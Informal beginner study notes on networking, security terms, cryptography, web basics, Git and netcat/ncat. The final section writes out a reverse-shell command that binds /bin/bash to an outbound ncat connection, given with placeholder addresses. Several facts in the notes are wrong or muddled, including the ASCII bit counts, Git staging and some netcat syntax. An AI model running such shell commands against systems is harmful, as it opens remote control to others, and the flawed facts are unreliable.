Bridged network in VM:
Means your virtual machine will act as a separate machine. It will have a separate ip address. You can still ping the physical machine where vm is installed , because it is in same subnet.

NAT:
stands for Network Address Translation. 
It is a way to convert multiple private ip's into one public ip.
Eg.Router. All devices connected inside a router will have separate private ip, but when a device sends traffic through router, at that time the private ip is switched to routers public ip only outside the network.
If we use NAT in vm, then our physical machine will acts as a router for our vm.

Vulnerability refers to a flaw or bug in a software or website.
Exploit is a way that hackers take advantage of the vulnerability.
Paylaod is a piece of code that is used to to exploit a bug.

Red Teaming:
Red team people focuses on offensive pentesting and try to hack into as many systems with the organisation's permission.

Blue Teaming:
Blue team people focuses on improving security by patching vulnerabilities, updating software and ensure that the security mechanisms were implemented and functioning properly. They are defensive.

Privileges:
A special functionality that only one person or a group has.
Priveleges means certain permission of user on certain files and folders.
Escalating those privileges to root user or Administrator user is called Privilege Escalation.

Denial of Service (DOS):
Sending a huge number of requests from a system to another computer is called Denial of Service.
If this attack performed by multiple computers then it is called as Distributed Denial of Service(DDOS)
This leads to crashing the system.

Buffer Overflow:
Whenever the application does not handle the input data correctly, data may overflow into memory regions like stack and then the application gets crashed.
Attacker can control the instruction pointer and runs their own malicious code.

Virus:
It grows itself and it affects only one system or a computer.

Worm:
It infects all computers running on that same network. It will create a botnet scenario.

Ransomware:
It encrypts all the data including files and folders. The user have to pay to recover them.

NETWORK:
A computer network is a group of devices that follow some communication protocols to sharing resources and for data transfer.
Network can be wired or wireless
Advantages:
*We can share resources between devices
*We can communicate to devices all over the globe.

CRYPTOGRAPHY:
Cryptography is an art of converting plain text to cipher text(gibberish)
When receiver receives the message then it is converted to plain text.
Cryptography mainly aims at privacy and integrity.
It is not the latest technique , its from thousands of years ago.
But they use some symbols.

Terminology:
1)Plain text: this is actual message sender wants to send to receiver.
2)Cipher text: this is unintelligible text and normal person cannot understand.
3)Encryption: this is the process of converting the plain text to cipher text.
4)Decryption: this is the process of converting the cipher text to plain text.
5)Cryptanalysis: study of understanding how algorithms works and finding weaknesses
6)Cryptanalyst: the person who does cryptanalysis is called cryptanalyst.

Ciphers:
1)Substitution ciphers: these ciphers replace the plain text characters with some other characters.
2)Block ciphers: these ciphers operates on some block of bits.
3)Symmetric encryption: same key is used in both encryption and decryption side.
4)Asymmetric encryption: Public key is used for encryption and private key is used for decryption.
5)Digital certificate: these certificates are used to establish a secure connection between sender and receiver.(encrypted) . Eg: SSL certificate.

Old ascii uses 7bits and have 127 characters.
ASCII uses 8bits. So the column will be 128 to 1.
There are 256 ASCII characters are there which includes all our keyboard buttons.
Unicode can go 8bits, 16bits and 32bits.

\0 is null byte and in C it is identified as string terminator.
So whatever comes after null byte, the application won't take it.
Eg: aaa\0bcdefg
The application will only take 'aaa' and ignore all the other characters after \0

Base64:
base64 have 64 characters which includes A-Z, a-z, 0-9, + , / 
base64 use 6bits

----------------------------------------------------------------------------------------------------------
WEB FUNDAMENTALS:

URL stands for Uniform Resource Locator
Its used to locate particular resource on the server
In browser we use http protocol to access resource on that web server.
Resource may be any html,image,pgf,js file etc..

Proxy is like a middle man between you and webserver.
Every requests and responses go through the proxy.
proxy can control heavy traffic and can reduce load for webserver.
proxy can also log client information
we can edit requests and responses using proxy tools such as burp suite, zap

URL encoding converts character into some format that can be sent over the internet
URL contains only ASCII characters.


Cookies:
Cookies are the uniques values used to identify the user
cookies are stored in client side
cookies contain info like sessionid,timestamp etc.
server can keep track of user activities using cookies..

First Party Cookies: These cookies are set directly by the webserver.
Third Party Cookies: These cookies are set by different websites.
Eg: A site may contain some ads, each ad can set a cookie to keep track of your searches
Ubuntu allowed amazon from16.04 version to keep track of user searches

Zombie Cookies: These are permanent cookies set by third parties and are hard to remove.
These are also called flash cookies because they gets stored in adobe flash.

Sessions:
sessions are unique id stored at the server side.
these are set to client to identify from then onwards.
when user logged in, new session id is created.
when user logged out, corresponding session id is destroyed.

Same Origin Policy:
According to this, a browser executes scripts only if the request has same protocol, same domain name and same port number.


--------------------------------------------------------------------------------------------------------
Sockets:
sockets are building blocks for Network programming
socket is a pair of ip address & port number
we can communicate with network applications using socket
many networking modules were built based on sockets. eg.nmap, scapy
even web modules use sockets in the backend 

-----------------------------------------------------------------------------------------------------
Git:

In client-server architecture, if the server goes down you can't access our files.
Whereas in version-control systems you, your teammates and the server will have project files.
In case server goes down, you can have local copy or else you can clone it from your teammates
Multiple backups and reverting back to previous versions are the main benefits of Version control systems.
Git is an version control system.

Github: this is where we store our project files in folders called repositories.
Gitlab: this is same like github but for personal or private projects.
Gitbook: this is for documenting your information.Its a digital notebook, you can have some pages to store data in markdown or html.

Working directory/tracking:
this is where our project files resides. If you modified the data and you want to save then add them to Staging area.

Staging Area: 
this is where our committed files resides ie)save files. 
we can now push to repository or can edit further.

------------------------------------------------------------------------------------------------------
Netcat:
It is a network tool that uses tcp udp connections to read and write in a network.
We can't execute commands

nc -nv <ip-address> <port>
The above command is used to connect to an IP address.

nc -nvlp <ip-address> <port>
The above command is used to open a port in our network and listen.

-------------------------------------------------------------------------------------
Ncat:
It is same as netcat, but uses encryption.
In ncat we can execute commands in reverse shell.

ncat -nv <ip-address> <port> -e /bin/bash
The above command is used to connect to an IP address and execute commands.

ncat -nvlp <ip-address> <port>
The above command is used to open a port in our network and listen.

-e /bin/bash
The above flag is used to execute commands when using ncat.
